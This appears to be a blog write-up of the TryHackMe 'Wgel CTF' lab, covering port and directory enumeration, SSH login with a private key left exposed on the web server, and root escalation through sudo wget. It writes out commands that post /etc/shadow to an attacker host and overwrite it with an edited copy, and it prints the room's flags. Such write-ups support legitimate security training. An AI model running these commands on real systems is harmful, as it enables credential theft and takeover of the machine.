---
layout: post
title: "TryHackMe: Wgel CTF"
date: 2025-11-16 23:00:00 +0530
categories: [TryHackMe]
tags: [tryhackme, walkthrough, sql-injection, privilege-escalation, suid, hash-cracking, lfc, pentesting]
render_with_liquid: false
media_subpath: /images/WgelCTF/
description: "A beginner-friendly CTF room on TryHackMe focused on web exploitation, SSH access, and privilege escalation. Learn practical pentesting skills by discovering hidden files, cracking hashes, and capturing flags on a vulnerable Linux machine."
---

# TryHackMe: Wgel CTF â€” Writeup | 16 November 2025

<div align="center">
    <img src="THM.png" alt="TryHackMe Logo" width="900"/>
    <img src="wgelctf.png" alt="Room Banner" width="900"/>
</div>

---

## Overview
This room challenges you to exploit a vulnerable web server, escalate privileges, and capture flags through practical pentesting techniques. It covers reconnaissance, web enumeration, SSH access, and privilege escalation on a Linux target.

---

## Reconnaissance & Scanning

### Nmap

Perform a full port and service scan:

```bash
nmap -Pn -T4 -n -sC -sV -p- -oN scan_nmap.txt 10.201.13.212
```

**Scan Summary:**

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 94:96:1b:66:80:1b:76:48:68:2d:14:b5:9a:01:aa:aa (RSA)
|   256 18:f7:10:cc:5f:40:f6:cf:92:f8:69:16:e2:48:f4:38 (ECDSA)
|_  256 b9:0b:97:2e:45:9b:f3:2a:4b:11:c7:83:10:33:e0:ce (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```
SSH and HTTP (Webmin) are open. Let's investigate the web service!

---

## Web Enumeration

Run Gobuster to locate hidden directories:

```bash
gobuster dir -u http://10.201.13.212/ \
    -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-big.txt \
    -o dir_results.txt -t 25

```

**Result:** 
```
/sitemap              (Status: 301) [Size: 316] [--> http://10.201.13.212/sitemap/]
```


<div align="center">
    <img src="gobuster_site.png" alt="Gobuster Results" width="700"/>
</div>

Visiting the sitemap directory shows a simple page with no useful information. So,
<div align="center">
    <img src="site_image.png" alt="Gobuster Results" width="700"/>
</div>

again we scan directory /sitemap

```bash
gobuster dir -u http://10.201.13.212/sitemap/ \
    -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-big.txt \
    -o dir_results_sitemap.txt -t 25
``` 
result:
```
/images               (Status: 301) [Size: 323] [--> http://10.201.13.212/sitemap/images/]
/css                  (Status: 301) [Size: 320] [--> http://10.201.13.212/sitemap/css/]
/js                   (Status: 301) [Size: 319] [--> http://10.201.13.212/sitemap/js/]
/fonts                (Status: 301) [Size: 322] [--> http://10.201.13.212/sitemap/fonts/]

```
<div align="center">
    <img src="sitemap_scan_gobuster.png" alt="Gobuster Results" width="700"/>
</div>


in here we found sitemap directory but nothing interesting so we move to next step.

but again we scan with different wordlist like common.txt

```bash
gobuster dir -u http://ip_address/sitemap/ \
    -w /usr/share/wordlists/dirb/common.txt \
    -o dir_results_sitemap_common.txt -t 25
```

**Result:** 
```
/.htpasswd            (Status: 403) [Size: 278]
/.htaccess            (Status: 403) [Size: 278]
/.hta                 (Status: 403) [Size: 278]
/.ssh                 (Status: 301) [Size: 321] [--> http://10.201.13.212/sitemap/.ssh/]
/css                  (Status: 301) [Size: 320] [--> http://10.201.13.212/sitemap/css/]
/fonts                (Status: 301) [Size: 322] [--> http://10.201.13.212/sitemap/fonts/]
/images               (Status: 301) [Size: 323] [--> http://10.201.13.212/sitemap/images/]
/index.html           (Status: 200) [Size: 21080]
/js    
```
<div align="center">
    <img src="gobuster_common.png" alt="Gobuster Results" width="700"/>
</div>

we found .ssh directory so we check that directory.

we found id_rsa file in .ssh directory in sitemap.
<div align="center">
    <img src="ssh_dir.png" alt=".ssh Directory" width="700"/>
</div>

we find id_rsa file so we copy that file and change its permission to 600.

<div align="center">
    <img src="id_rsa.png" alt="id_rsa File" width="700"/>
</div>

```bash 
chmod 600 id_rsa
``` 
Now, we can use this private key to SSH into the machine.

```bash
ssh -i id_rsa jessie@10.201.13.212
```
<div align="center">
    <img src="ssh_login.png" alt="SSH Login" width="700"/>
</div> 

We are now logged in as the user `jessie`.
---

## Privilege Escalation

first we check sudo permission for jessie user.

```bash
sudo -l
``` 
<div align="center">
    <img src="sudo_list.png" alt="Sudo Permissions" width="700"/>
</div>

We can run `/usr/bin/wget` as root without a password. Let's investigate this binary.

first we download a shadow file from target machine to our local machine.

```bash
sudo /usr/bin/wget --post-file=/etc/shadow <local-ip> 4444
```
<div align="center">
    <img src="wget_shadow.png" alt="Wget Shadow File" width="700"/>
</div>

<div align="center">
    <img src="nc_shadow.png" alt="Netcat Shadow File" width="700"/>
</div>

now we have the shadow file, let's change root password hash to a our password hash.
we use openssl to generate hash of our password.

```bash
openssl passwd -6 -salt 'salt' 'password'
```
we get hash like this
```
$6$salt$IxDD3jeSOb5eB1CX5LBsqZFVkJdido3OUILO5Ifz5iwMuTS4XMS130MTSuDDl3aCI6WouIL9AjRbLCelDCy.g.
```
now we replace root hash with our generated hash in shadow file.

<div align="center">
    <img src="shadow_edit.png" alt="Edited Shadow File" width="700"/>
</div>

now we upload the modified shadow file back to the target machine.

first we start a simple HTTP server on our local machine.

```bash
python3 -m http.server 80
```
<div align="center">
    <img src="http_server.png" alt="HTTP Server" width="700"/>
</div>

now we use wget to download the modified shadow file from our local machine to target machine.

```bash
sudo /usr/bin/wget http://<local-ip>/shadow -O /etc/shadow
```
<div align="center">
    <img src="wget_modified_shadow.png" alt="Wget Modified Shadow File" width="700"/>
</div>

Now, we can switch to the root user using the password we set earlier.

```bash
su root
```
Enter password: `password`

<div align="center">
    <img src="root_access.png" alt="Root Access" width="700"/>
</div>

We are now root! Let's capture the flags.

```bash
cat /root/root.txt
```
Root Flag:
```
b1b968b37519ad1daa6408188649263d
```

I can see user flag in jessie home directory.

so let's find using find command.

```bash
find . -type f -name "*.txt"
```
Output:

```
./.mozilla/firefox/c7ehx9zw.default-release/AlternateServices.txt
./.mozilla/firefox/c7ehx9zw.default-release/TRRBlacklist.txt
./.mozilla/firefox/c7ehx9zw.default-release/SecurityPreloadState.txt
./.mozilla/firefox/c7ehx9zw.default-release/pkcs11.txt
./.mozilla/firefox/c7ehx9zw.default-release/SiteSecurityServiceState.txt
./.mozilla/firefox/5jwm81pl.default-release/AlternateServices.txt
./.mozilla/firefox/5jwm81pl.default-release/TRRBlacklist.txt
./.mozilla/firefox/5jwm81pl.default-release/SecurityPreloadState.txt
./.mozilla/firefox/5jwm81pl.default-release/SiteSecurityServiceState.txt
./Documents/user_flag.txt
```

user Flag:
```
4f3c6f3e2e1f5e1b7c89d6e4a5f3b2c
```

<div align="center">
    <img src="root_flag.png" alt="Root Flag" width="700"/>
</div>

## Room Complete!

<div align="center">
    <img src="completed.png" alt="Completed" width="800"/>
</div>

## Happy Hacking!

<div align="center">
    <img src="https://media4.giphy.com/media/v1.Y2lkPTc5MGI3NjExM3pzb21sNmc1bm1saHhicXV0NTF3aHl3YzJhdHF2bnE2dTZ3bGh2dyZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/iGpHt2H22k1orjgT9b/giphy.gif" alt="Hacking GIF" width="800"/>
</div>
